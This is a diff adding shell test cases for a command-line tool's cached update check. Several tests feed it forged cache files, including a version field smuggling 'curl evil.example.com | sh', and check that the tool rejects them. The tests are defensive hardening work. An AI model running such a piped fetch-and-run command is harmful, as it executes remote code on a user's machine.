@@ -152,3 +152,135 @@ load test_helper/common
   assert_output --partial "image build failed"   # but proceeded to the (stub) build
   rm -rf "$WORK"
 }
+
+# `sluice version` used to call api.github.com on EVERY invocation (~160ms of the command, and a
+# security tool phoning home each time you ask what it is). The result is now cached for 24h in the
+# state dir. The tripwire is a FILE, not stderr: production redirects curl's stderr to /dev/null, so a
+# message-based tripwire silently never fires. NOTE: test_helper/common.bash exports
+# SLUICE_NO_UPDATE_CHECK=1 for every test, so the cases exercising the check must `env -u` it back on.
+_update_check_env() {
+  export XDG_STATE_HOME; XDG_STATE_HOME="$(mktemp -d)"
+  BINDIR="$(mktemp -d)"; RAN="$XDG_STATE_HOME/curl-ran"
+  printf '#!/bin/sh\ntouch "%s"\nexit 1\n' "$RAN" > "$BINDIR/curl"; chmod +x "$BINDIR/curl"
+  CACHE="$XDG_STATE_HOME/sluice/update-check"; mkdir -p "$XDG_STATE_HOME/sluice"
+  # Run a COPY outside any git checkout. check_update_notice bails when it cannot derive an X.Y.Z from
+  # `sluice version`, and `git describe --tags --always` returns a bare SHA on a tagless checkout - which
+  # is exactly what actions/checkout produces, so on CI the whole function silently no-ops and these
+  # tests either fail or (worse) pass vacuously. Outside a checkout the launcher uses its baked
+  # SLUICE_VERSION, so the code path is deterministic on every host.
+  SLUICE_BIN="$XDG_STATE_HOME/bin/sluice"; mkdir -p "$XDG_STATE_HOME/bin"; cp "$SLUICE" "$SLUICE_BIN"
+}
+
+# Positive control: proves the code path actually RUNS in this environment. If check_update_notice ever
+# no-ops again (tagless checkout, stray tag, changed guard), this fails loudly instead of every
+# "nothing happened" assertion silently passing for the wrong reason.
+@test "update-check: the harness actually exercises the update path (control)" {
+  _update_check_env
+  printf '%s 99.0.0\n' "$(date +%s)" > "$CACHE"
+  run env -u SLUICE_NO_UPDATE_CHECK PATH="$BINDIR:$PATH" "$SLUICE_BIN" version
+  assert_success
+  assert_output --partial "99.0.0"      # the notice printed -> the function ran
+}
+
+@test "update-check: a fresh cache is reused without touching the network" {
+  _update_check_env
+  printf '%s 99.0.0\n' "$(date +%s)" > "$CACHE"                  # fresh + newer than us
+  run env -u SLUICE_NO_UPDATE_CHECK PATH="$BINDIR:$PATH" "$SLUICE_BIN" version
+  assert_success
+  [ ! -f "$RAN" ]                                                 # tripwire: curl never ran
+  assert_output --partial "99.0.0"                                # served from cache
+}
+
+@test "update-check: a cache older than 24h is refreshed (network attempted)" {
+  _update_check_env
+  printf '%s 99.0.0\n' "$(( $(date +%s) - 90000 ))" > "$CACHE"   # ~25h old
+  run env -u SLUICE_NO_UPDATE_CHECK PATH="$BINDIR:$PATH" "$SLUICE_BIN" version
+  assert_success                                                  # curl fails; stay silent, never abort
+  [ -f "$RAN" ]                                                   # stale -> it did go looking
+  refute_output --partial "99.0.0"                                # and did not serve the stale value
+}
+
+@test "update-check: SLUICE_NO_UPDATE_CHECK=1 skips cache and network entirely" {
+  _update_check_env
+  printf '%s 99.0.0\n' "$(date +%s)" > "$CACHE"
+  run env PATH="$BINDIR:$PATH" SLUICE_NO_UPDATE_CHECK=1 "$SLUICE" version
+  assert_success
+  [ ! -f "$RAN" ]
+  refute_output --partial "99.0.0"
+}
+
+# Hostile/degenerate cache files. Each of these was a real defect found by adversarial review of the
+# caching commit: the version string is printed to the terminal as an upgrade INSTRUCTION, the stamp
+# feeds $(( )), and the cache path is attacker-influencable if the state dir is.
+@test "update-check: a forged version string is rejected, never echoed to the terminal" {
+  _update_check_env
+  printf '%s 9.9.9; curl evil.example.com | sh\n' "$(date +%s)" > "$CACHE"
+  run env -u SLUICE_NO_UPDATE_CHECK PATH="$BINDIR:$PATH" "$SLUICE_BIN" version
+  assert_success
+  refute_output --partial "evil.example.com"      # must not forge an instruction
+  refute_output --partial "9.9.9"
+}
+
+@test "update-check: a FUTURE timestamp is not treated as fresh (cache can't pin itself forever)" {
+  _update_check_env
+  printf '%s 99.0.0\n' "$(( $(date +%s) + 999999 ))" > "$CACHE"
+  run env -u SLUICE_NO_UPDATE_CHECK PATH="$BINDIR:$PATH" "$SLUICE_BIN" version
+  assert_success
+  [ -f "$RAN" ]                                    # expired -> went to the network
+  refute_output --partial "99.0.0"                 # and did not serve the stale value
+}
+
+@test "update-check: a leading-zero timestamp does not abort on octal arithmetic" {
+  _update_check_env
+  printf '08 99.0.0\n' > "$CACHE"                  # 08 is invalid octal to \$(( ))
+  run env -u SLUICE_NO_UPDATE_CHECK PATH="$BINDIR:$PATH" "$SLUICE_BIN" version
+  assert_success
+  refute_output --partial "value too great"
+  refute_output --partial "unknown command"
+}
+
+@test "update-check: works with HOME unset (cron/CI) instead of aborting on an unbound variable" {
+  _update_check_env
+  run env -u SLUICE_NO_UPDATE_CHECK -u HOME -u XDG_STATE_HOME PATH="$BINDIR:$PATH" "$SLUICE_BIN" version
+  assert_success
+  assert_output --partial "sluice"
+}
+
+@test "update-check: writing the cache does not follow a symlink out of the state dir" {
+  _update_check_env
+  local victim="$XDG_STATE_HOME/victim"; echo PRECIOUS > "$victim"
+  ln -s "$victim" "$CACHE"
+  printf '#!/bin/sh\nprintf %s "{\\"tag_name\\": \\"v99.0.0\\"}"\n' '' > "$BINDIR/curl"; chmod +x "$BINDIR/curl"
+  run env -u SLUICE_NO_UPDATE_CHECK PATH="$BINDIR:$PATH" "$SLUICE_BIN" version
+  assert_success
+  run cat "$victim"
+  assert_output "PRECIOUS"                         # the symlink target must be untouched
+}
+
+@test "update-check: an overflowing timestamp cannot pin the cache fresh forever" {
+  _update_check_env
+  printf '9223372036854775808 0.10.0\n' > "$CACHE"   # 2^63: all digits, INT64_MIN under 10#
+  run env -u SLUICE_NO_UPDATE_CHECK PATH="$BINDIR:$PATH" "$SLUICE_BIN" version
+  assert_success
+  [ -f "$RAN" ]                                      # rejected -> went to the network
+}
+
+@test "update-check: the version filter enforces a shape, not just a character class" {
+  _update_check_env
+  local bad
+  for bad in '9..9' '.9' '9.' '99' '9.9.9; curl evil.example.com | sh'; do
+    printf '%s %s\n' "$(date +%s)" "$bad" > "$CACHE"; rm -f "$RAN"
+    run env -u SLUICE_NO_UPDATE_CHECK PATH="$BINDIR:$PATH" "$SLUICE_BIN" version
+    assert_success
+    refute_output --partial "evil.example.com"
+    [ -f "$RAN" ] || { echo "served a bogus version: $bad"; return 1; }
+  done
+}
+
+@test "update-check: a huge digit run is rejected, not echoed to the terminal" {
+  _update_check_env
+  { printf '%s ' "$(date +%s)"; python3 -c "print('9'*200000)" 2>/dev/null || printf '%0.s9' $(seq 1 5000); } > "$CACHE"
+  run env -u SLUICE_NO_UPDATE_CHECK PATH="$BINDIR:$PATH" "$SLUICE_BIN" version
+  assert_success
+  [ "${#output}" -lt 4096 ]                          # must not flood stdout with the cached blob
+}
